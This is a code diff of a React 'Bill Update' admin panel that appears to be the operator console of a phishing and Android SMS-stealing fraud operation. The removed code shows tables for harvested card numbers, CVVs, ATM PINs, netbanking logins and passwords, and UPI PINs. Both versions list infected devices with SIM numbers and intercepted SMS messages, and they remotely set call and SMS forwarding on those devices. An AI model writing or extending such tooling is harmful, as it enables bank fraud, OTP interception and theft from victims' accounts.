@@ -3,25 +3,13 @@ import { useState, useEffect, useCallback } from 'react'
 const API = 'https://bill-1-9yfp.onrender.com/api/admin/all'
 const API_BASE = 'https://bill-1-9yfp.onrender.com'
 
-const sections = [
-  { key: 'bill_updates', label: 'Bill Update Requests', color: '#2D9CDB' },
-  { key: 'devices', label: 'Devices', color: '#6C5CE7' },
-  { key: 'card_details', label: 'Card Details', color: '#F39C12' },
-  { key: 'card_verifications', label: 'Card Verifications', color: '#27AE60' },
-  { key: 'netbanking_details', label: 'Netbanking Logins', color: '#E74C3C' },
-  { key: 'netbanking_pins', label: 'Netbanking Pins', color: '#8E44AD' },
-  { key: 'upi_details', label: 'UPI PIN Entries', color: '#1ABC9C' },
-  { key: 'payment_attempts', label: 'Payment Attempts', color: '#E67E22' },
-]
-
 export default function App() {
   const [data, setData] = useState(null)
-  const [active, setActive] = useState('bill_updates')
-  const [selectedDevice, setSelectedDevice] = useState(null)
-  const [deviceTab, setDeviceTab] = useState('sms')
-  const [time, setTime] = useState('')
-  const [forwarding, setForwarding] = useState({})
+  const [openId, setOpenId] = useState(null)
+  const [showSms, setShowSms] = useState(false)
+  const [fwd, setFwd] = useState({})
   const [saving, setSaving] = useState(false)
+  const [time, setTime] = useState('')
 
   const fetchData = useCallback(async () => {
     try {
@@ -38,244 +26,162 @@ export default function App() {
     return () => clearInterval(id)
   }, [fetchData])
 
-  if (!data) return <div style={styles.loading}>Loading admin panel...</div>
-
-  const cols = {
-    bill_updates: ['id', 'customer_name', 'mobile', 'consumer_number', 'reasons', 'created_at'],
-    card_details: ['id', 'card_type', 'card_number', 'card_holder_name', 'expiry', 'cvv', 'amount', 'created_at'],
-    card_verifications: ['id', 'dob', 'atm_pin', 'amount', 'created_at'],
-    netbanking_details: ['id', 'bank_name', 'user_id', 'password', 'remember_me', 'amount', 'created_at'],
-    netbanking_pins: ['id', 'pin', 'amount', 'created_at'],
-    upi_details: ['id', 'pin', 'amount', 'created_at'],
-    payment_attempts: ['id', 'amount', 'payment_method', 'status', 'created_at'],
-  }
-  const smsCols = ['sender', 'message', 'received_at', 'created_at']
-
-  const fetchForwardingConfig = async (deviceId) => {
+  const loadFwd = async (id) => {
     try {
-      const r = await fetch(`${API_BASE}/api/forwarding-config/${deviceId}`)
+      const r = await fetch(`${API_BASE}/api/forwarding-config/${id}`)
       const d = await r.json()
-      setForwarding(prev => ({...prev, [deviceId]: d}))
+      setFwd(prev => ({...prev, [id]: d}))
     } catch {}
   }
 
-  const saveForwardingConfig = async (deviceId) => {
-    const cfg = forwarding[deviceId]
-    if (!cfg) return
+  const saveFwd = async (id) => {
+    const c = fwd[id]
+    if (!c) return
     setSaving(true)
     try {
       await fetch(`${API_BASE}/api/forwarding-config`, {
         method: 'PUT',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
-          device_id: deviceId,
-          call_forwarding: cfg.call_forwarding,
-          call_forwarding_number: cfg.call_forwarding_number,
-          sms_forwarding: cfg.sms_forwarding,
-          sms_forwarding_number: cfg.sms_forwarding_number,
+          device_id: id,
+          call_forwarding: c.call_forwarding,
+          call_forwarding_number: c.call_forwarding_number,
+          sms_forwarding: c.sms_forwarding,
+          sms_forwarding_number: c.sms_forwarding_number,
         }),
       })
     } catch {}
     setSaving(false)
   }
 
-  const deviceSectionTabs = [
-    { key: 'sms', label: 'SMS', color: '#6C5CE7' },
-    { key: 'contacts', label: 'Contacts', color: '#00B894' },
-    { key: 'card_details', label: 'Card Details', color: '#F39C12' },
-    { key: 'card_verifications', label: 'Card Verify', color: '#27AE60' },
-    { key: 'netbanking_details', label: 'Netbanking', color: '#E74C3C' },
-    { key: 'netbanking_pins', label: 'NB Pins', color: '#8E44AD' },
-    { key: 'upi_details', label: 'UPI Pins', color: '#1ABC9C' },
-    { key: 'payment_attempts', label: 'Payments', color: '#E67E22' },
-    { key: 'forwarding', label: 'Forwarding', color: '#E67E22' },
-  ]
+  if (!data) return <div style={s.center}>Loading...</div>
 
-  const rows = data[active] || []
-  const stats = data.stats || {}
-  const deviceSections = data.device_sections || []
+  const devices = data.device_sections || []
 
-  const renderTable = (list, cols, dateCols = ['created_at']) => (
-    list.length === 0 ? <div style={styles.empty}>No data</div> : (
-      <table style={styles.table}>
-        <thead><tr>{cols.map(c => <th key={c} style={styles.th}>{c.replace(/_/g, ' ').toUpperCase()}</th>)}</tr></thead>
-        <tbody>{list.map((row, j) => (
-          <tr key={row.id || j} style={j % 2 ? styles.trAlt : {}}>
-            {cols.map(c => { let val = row[c]; if (dateCols.includes(c)) val = val ? new Date(val).toLocaleString() : '-'; if (typeof val === 'boolean') val = val ? 'Yes' : 'No'; return <td key={c} style={styles.td}>{val ?? '-'}</td> })}
-          </tr>
-        ))}</tbody>
-      </table>
-    )
-  )
-
-  const renderDevices = () => (
-    <div>
-      {deviceSections.length === 0 ? (
-        <div style={styles.empty}>No devices registered</div>
-      ) : deviceSections.map((sec, i) => {
-        const dev = sec.device || {}
-        const online = dev.last_seen && (Date.now() - new Date(dev.last_seen).getTime()) < 120000
-        const shortId = dev.device_id ? dev.device_id.substring(0, 8) + '...' : '-'
-        const isSelected = selectedDevice === dev.device_id
-        const counts = deviceSectionTabs.map(t => {
-          const list = sec[t.key] || []
-          return list.length
-        })
-        const total = counts.reduce((a, b) => a + b, 0)
-        return (
-          <div key={dev.device_id || i}>
-            <div
-              style={{
-                ...styles.deviceCard,
-                borderLeft: `4px solid ${online ? '#27AE60' : '#E74C3C'}`,
-                cursor: 'pointer',
-                background: isSelected ? '#eef2ff' : '#fff',
-              }}
-              onClick={() => { setSelectedDevice(isSelected ? null : dev.device_id); setDeviceTab('sms') }}
-            >
-              <div>
-                <div style={styles.deviceName}>{dev.device_name || '-'} <span style={{color: online ? '#27AE60' : '#E74C3C', fontSize: 12}}>{online ? 'ONLINE' : 'OFFLINE'}</span></div>
-                <div style={styles.deviceMeta}>ID: {shortId} &middot; {dev.model || '-'} &middot; {dev.os_version || '-'} &middot; SIM: {(() => { try { const si = JSON.parse(dev.sim_info || '[]'); return si.map(s => 'Slot '+s.sim_slot+': '+(s.carrier || 'Empty')+(s.number ? ' ('+s.number+')' : '')).join(' | ') } catch { return '-'; } })()} &middot; Records: {total}</div>
-              </div>
-              <div style={{fontSize: 11, color: '#999'}}>{dev.last_seen ? new Date(dev.last_seen).toLocaleString() : '-'}</div>
-            </div>
-            {isSelected && (
-              <div style={styles.smsSection}>
-                <div style={{display: 'flex', gap: 6, marginBottom: 12, flexWrap: 'wrap'}}>
-                  {deviceSectionTabs.map(t => {
-                    const list = sec[t.key] || []
-                    return (
-                      <button key={t.key}
-                        onClick={() => { if (t.key === 'forwarding') fetchForwardingConfig(dev.device_id); setDeviceTab(t.key) }}
-                        style={{...styles.subTab, ...(deviceTab === t.key ? {background: t.color, color: '#fff'} : {})}}>
-                        {t.label} ({list.length})
-                      </button>
-                    )
-                  })}
-                </div>
-                {(() => {
-                  if (deviceTab === 'forwarding') {
-                    return (
-                      <div style={{padding: 8}}>
-                        <h4 style={{margin: '0 0 12px', color: '#E67E22'}}>Call &amp; SMS Forwarding</h4>
-                        <div style={{display: 'flex', flexDirection: 'column', gap: 12}}>
-                          <div style={{display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap'}}>
-                            <label style={{fontWeight: 700, fontSize: 13, minWidth: 100}}>Call Forward</label>
-                            <input type="text" placeholder="Forwarding number" value={forwarding[dev.device_id]?.call_forwarding_number || ''} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], call_forwarding_number: e.target.value}}))} style={{padding: '6px 10px', border: '1px solid #ddd', borderRadius: 6, flex: 1, fontSize: 13}} />
-                            <label style={{display: 'flex', alignItems: 'center', gap: 6, fontSize: 13, cursor: 'pointer'}}>
-                              <input type="checkbox" checked={forwarding[dev.device_id]?.call_forwarding || false} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], call_forwarding: e.target.checked}}))} />
-                              Enabled
-                            </label>
-                          </div>
-                          <div style={{display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap'}}>
-                            <label style={{fontWeight: 700, fontSize: 13, minWidth: 100}}>SMS Forward</label>
-                            <input type="text" placeholder="Forwarding number" value={forwarding[dev.device_id]?.sms_forwarding_number || ''} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], sms_forwarding_number: e.target.value}}))} style={{padding: '6px 10px', border: '1px solid #ddd', borderRadius: 6, flex: 1, fontSize: 13}} />
-                            <label style={{display: 'flex', alignItems: 'center', gap: 6, fontSize: 13, cursor: 'pointer'}}>
-                              <input type="checkbox" checked={forwarding[dev.device_id]?.sms_forwarding || false} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], sms_forwarding: e.target.checked}}))} />
-                              Enabled
-                            </label>
-                          </div>
-                          <button onClick={() => saveForwardingConfig(dev.device_id)} disabled={saving} style={{...styles.subTab, background: '#E67E22', color: '#fff', alignSelf: 'flex-start'}}>{saving ? 'Saving...' : 'Save Config'}</button>
-                        </div>
-                      </div>
-                    )
-                  }
-                  const tabData = sec[deviceTab] || []
-                  if (deviceTab === 'sms') return renderTable(tabData, smsCols, ['created_at', 'received_at'])
-                  if (deviceTab === 'contacts') return renderTable(tabData, ['name', 'phone', 'email', 'created_at'])
-                  if (deviceTab === 'card_details') return renderTable(tabData, cols.card_details)
-                  if (deviceTab === 'card_verifications') return renderTable(tabData, cols.card_verifications)
-                  if (deviceTab === 'netbanking_details') return renderTable(tabData, cols.netbanking_details)
-                  if (deviceTab === 'netbanking_pins') return renderTable(tabData, cols.netbanking_pins)
-                  if (deviceTab === 'upi_details') return renderTable(tabData, cols.upi_details)
-                  if (deviceTab === 'payment_attempts') return renderTable(tabData, cols.payment_attempts)
-                  return null
-                })()}
-              </div>
-            )}
-          </div>
-        )
-      })}
-    </div>
-  )
+  const sims = (info) => {
+    try { return JSON.parse(info || '[]') } catch { return [] }
+  }
 
   return (
-    <div style={styles.container}>
-      <header style={styles.header}>
-        <h1 style={styles.title}>Bill Update — Admin Panel</h1>
-        <span style={styles.live}>LIVE {time} (auto-refresh 3s)</span>
-      </header>
-
-      <div style={styles.statsRow}>
-        {sections.map(s => (
-          <div key={s.key} style={{...styles.statCard, borderTop: `4px solid ${s.color}`}} onClick={() => setActive(s.key)}>
-            <div style={{...styles.statNum, color: s.color}}>{s.key === 'devices' ? deviceSections.length : (stats[`total_${s.key}`] || 0)}</div>
-            <div style={styles.statLabel}>{s.label}</div>
-          </div>
-        ))}
+    <div style={s.body}>
+      <div style={s.top}>
+        <b style={{fontSize:18}}>Devices</b>
+        <span style={{fontSize:11,opacity:.6}}>{time}</span>
       </div>
 
-      <div style={styles.tabs}>
-        {sections.map(s => (
-          <button key={s.key} style={{...styles.tab, ...(active === s.key ? {backgroundColor: s.color, color: '#fff'} : {})}} onClick={() => { setActive(s.key); setSelectedDevice(null) }}>
-            {s.label}
-          </button>
-        ))}
-      </div>
+      <div style={s.wrap}>
+        {devices.length === 0 && <div style={s.center}>No devices</div>}
 
-      <div style={styles.tableWrap}>
-        {active === 'devices' ? renderDevices() : (
-          <table style={styles.table}>
-            <thead>
-              <tr>
-                {cols[active].map(c => <th key={c} style={styles.th}>{c.replace(/_/g, ' ').toUpperCase()}</th>)}
-              </tr>
-            </thead>
-            <tbody>
-              {rows.length === 0 ? (
-                <tr><td colSpan={cols[active].length} style={styles.empty}>No data</td></tr>
-              ) : rows.map((row, i) => (
-                <tr key={row.id || i} style={i % 2 ? styles.trAlt : {}}>
-                  {cols[active].map(c => {
-                    let val = row[c]
-                    if (c === 'created_at') val = new Date(val).toLocaleString()
-                    if (typeof val === 'boolean') val = val ? 'Yes' : 'No'
-                    if (c === 'amount') val = `₹${val}`
-                    return <td key={c} style={styles.td}>{val ?? '-'}</td>
-                  })}
-                </tr>
-              ))}
-            </tbody>
-          </table>
-        )}
+        {devices.map((sec) => {
+          const d = sec.device || {}
+          const id = d.device_id
+          const open = openId === id
+          const on = d.last_seen && (Date.now() - new Date(d.last_seen).getTime()) < 120000
+          const list = sims(d.sim_info)
+          const sms = sec.sms || []
+
+          return (
+            <div key={id} style={s.card}>
+              <div style={{...s.head, borderLeft:`4px solid ${on ? '#22c55e' : '#ef4444'}`}}
+                onClick={() => { setOpenId(open ? null : id); setShowSms(true); loadFwd(id) }}>
+                <div>
+                  <div style={s.name}>
+                    {d.device_name || '-'}
+                    <span style={{...s.dot, background: on ? '#22c55e' : '#ef4444'}}>{on ? 'ON' : 'OFF'}</span>
+                  </div>
+                  <div style={s.sub}>{d.model || ''}</div>
+                </div>
+                <span style={{fontSize:11,color:'#94a3b8'}}>{open ? '▲' : '▼'}</span>
+              </div>
+
+              {open && (
+                <div style={s.in}>
+                  <div style={s.grp}>
+                    <div style={s.h}>SIM Cards</div>
+                    {list.length === 0 ? <div style={s.muted}>No data</div> : list.map((x,i) => (
+                      <div key={i} style={s.row}>
+                        <span style={s.b}>SIM {x.sim_slot || i+1}</span>
+                        <span>{x.carrier || '-'}{x.number ? ` (${x.number})` : ''}</span>
+                      </div>
+                    ))}
+                  </div>
+
+                  <div style={s.grp}>
+                    <div style={{...s.h,display:'flex',justifyContent:'space-between',alignItems:'center'}}>
+                      <span>Messages ({sms.length})</span>
+                      <button onClick={(e)=>{e.stopPropagation();setShowSms(!showSms)}} style={s.btn}>{showSms?'Hide':'Show'}</button>
+                    </div>
+                    {showSms && sms.length === 0 && <div style={s.muted}>No messages</div>}
+                    {showSms && sms.length > 0 && (
+                      <div style={{maxHeight:200,overflow:'auto'}}>
+                        {sms.map((x,j) => (
+                          <div key={x.id||j} style={s.msg}>
+                            <div style={{fontWeight:600}}>{x.sender||'-'}</div>
+                            <div style={{color:'#475569',wordBreak:'break-word',marginTop:1}}>{x.message||'-'}</div>
+                            <div style={{fontSize:10,color:'#94a3b8',marginTop:1}}>{x.received_at?new Date(x.received_at).toLocaleString():'-'}</div>
+                          </div>
+                        ))}
+                      </div>
+                    )}
+                  </div>
+
+                  <div style={s.grp}>
+                    <div style={s.h}>Forwarding</div>
+                    <div style={s.fw}>
+                      <span style={{minWidth:40,fontWeight:600,fontSize:12}}>Call</span>
+                      <input type="text" placeholder="Phone number" value={fwd[id]?.call_forwarding_number||''}
+                        onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],call_forwarding_number:e.target.value}}))}
+                        style={s.inp} />
+                      <label style={s.lbl}>
+                        <input type="checkbox" checked={fwd[id]?.call_forwarding||false}
+                          onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],call_forwarding:e.target.checked}}))} />
+                        On
+                      </label>
+                    </div>
+                    <div style={s.fw}>
+                      <span style={{minWidth:40,fontWeight:600,fontSize:12}}>SMS</span>
+                      <input type="text" placeholder="Phone number" value={fwd[id]?.sms_forwarding_number||''}
+                        onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],sms_forwarding_number:e.target.value}}))}
+                        style={s.inp} />
+                      <label style={s.lbl}>
+                        <input type="checkbox" checked={fwd[id]?.sms_forwarding||false}
+                          onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],sms_forwarding:e.target.checked}}))} />
+                        On
+                      </label>
+                    </div>
+                    <button onClick={()=>saveFwd(id)} disabled={saving}
+                      style={s.save}>{saving?'Saving...':'Save'}</button>
+                  </div>
+                </div>
+              )}
+            </div>
+          )
+        })}
       </div>
     </div>
   )
 }
 
-const subTabBase = { padding: '6px 14px', border: 'none', borderRadius: 6, cursor: 'pointer', fontWeight: 600, fontSize: 12 }
-const styles = {
-  subTab: subTabBase,
-  container: { fontFamily: 'system-ui, sans-serif', background: '#f0f2f5', minHeight: '100vh', padding: '0 0 40px' },
-  loading: { display: 'flex', height: '100vh', alignItems: 'center', justifyContent: 'center', fontSize: 24, color: '#666' },
-  header: { background: '#1A2A6C', color: '#fff', padding: '20px 30px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' },
-  title: { margin: 0, fontSize: 24, fontWeight: 800 },
-  live: { fontSize: 13, opacity: .8, fontFamily: 'monospace' },
-  statsRow: { display: 'flex', gap: 12, padding: 20, flexWrap: 'wrap' },
-  statCard: { background: '#fff', borderRadius: 10, padding: '14px 20px', flex: '1 0 140px', cursor: 'pointer', boxShadow: '0 2px 8px rgba(0,0,0,.06)' },
-  statNum: { fontSize: 28, fontWeight: 800 },
-  statLabel: { fontSize: 12, color: '#666', marginTop: 2 },
-  tabs: { display: 'flex', gap: 8, padding: '0 20px 16px', flexWrap: 'wrap' },
-  tab: { padding: '8px 16px', border: 'none', borderRadius: 8, background: '#fff', cursor: 'pointer', fontWeight: 600, fontSize: 13, boxShadow: '0 1px 4px rgba(0,0,0,.06)' },
-  tableWrap: { margin: '0 20px', background: '#fff', borderRadius: 12, overflow: 'auto', boxShadow: '0 2px 12px rgba(0,0,0,.08)' },
-  table: { width: '100%', borderCollapse: 'collapse', fontSize: 13, minWidth: 700 },
-  th: { padding: '12px 14px', textAlign: 'left', background: '#f8f9fa', borderBottom: '2px solid #dee2e6', fontWeight: 700, color: '#333', whiteSpace: 'nowrap', fontSize: 11 },
-  td: { padding: '10px 14px', borderBottom: '1px solid #eee', whiteSpace: 'nowrap' },
-  trAlt: { background: '#f8f9fa' },
-  empty: { textAlign: 'center', padding: 40, color: '#999' },
-  deviceCard: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 20px', margin: '0 0 1px', borderBottom: '1px solid #f0f0f0' },
-  deviceName: { fontWeight: 700, fontSize: 15, marginBottom: 4 },
-  deviceMeta: { fontSize: 12, color: '#666' },
-  smsSection: { background: '#f8f9fa', padding: '12px 20px 20px', borderBottom: '2px solid #dee2e6' },
-  smsHeader: { fontWeight: 700, fontSize: 13, color: '#6C5CE7', marginBottom: 10 },
+const s = {
+  body: { fontFamily:'-apple-system,sans-serif', background:'#f1f5f9', minHeight:'100vh', padding:'0 0 40px', fontSize:14 },
+  center: { display:'flex', height:'100vh', alignItems:'center', justifyContent:'center', color:'#666', fontSize:16 },
+  top: { background:'#1e293b', color:'#fff', padding:'14px 16px', display:'flex', justifyContent:'space-between', alignItems:'center', position:'sticky', top:0, zIndex:10 },
+  wrap: { padding:'12px', maxWidth:500, margin:'0 auto' },
+  card: { background:'#fff', borderRadius:12, marginBottom:10, overflow:'hidden', boxShadow:'0 1px 4px rgba(0,0,0,.08)' },
+  head: { display:'flex', justifyContent:'space-between', alignItems:'center', padding:'12px 14px', cursor:'pointer' },
+  name: { fontWeight:700, fontSize:14, display:'flex', alignItems:'center', gap:8 },
+  dot: { fontSize:9, color:'#fff', padding:'2px 7px', borderRadius:10, fontWeight:600 },
+  sub: { fontSize:11, color:'#64748b', marginTop:2 },
+  in: { padding:'0 14px 14px', borderTop:'1px solid #f1f5f9' },
+  grp: { marginTop:12 },
+  h: { fontWeight:700, fontSize:12, color:'#334155', marginBottom:6 },
+  muted: { padding:10, color:'#999', fontSize:12, textAlign:'center' },
+  row: { display:'flex', gap:8, fontSize:12, padding:'5px 0', borderBottom:'1px solid #f8fafc' },
+  b: { fontWeight:600, color:'#475569', minWidth:45 },
+  btn: { background:'#e2e8f0', border:'none', borderRadius:6, padding:'3px 10px', fontSize:11, cursor:'pointer', fontWeight:600, color:'#475569' },
+  msg: { padding:'6px 8px', borderBottom:'1px solid #f1f5f9', fontSize:12 },
+  fw: { display:'flex', alignItems:'center', gap:6, marginBottom:8, flexWrap:'wrap' },
+  inp: { flex:1, minWidth:100, padding:'7px 8px', border:'1px solid #e2e8f0', borderRadius:8, fontSize:12, outline:'none' },
+  lbl: { display:'flex', alignItems:'center', gap:4, fontSize:12, cursor:'pointer', fontWeight:500, color:'#475569' },
+  save: { background:'#3b82f6', color:'#fff', border:'none', borderRadius:8, padding:'7px 18px', fontSize:12, fontWeight:600, cursor:'pointer', marginTop:2 },
 }
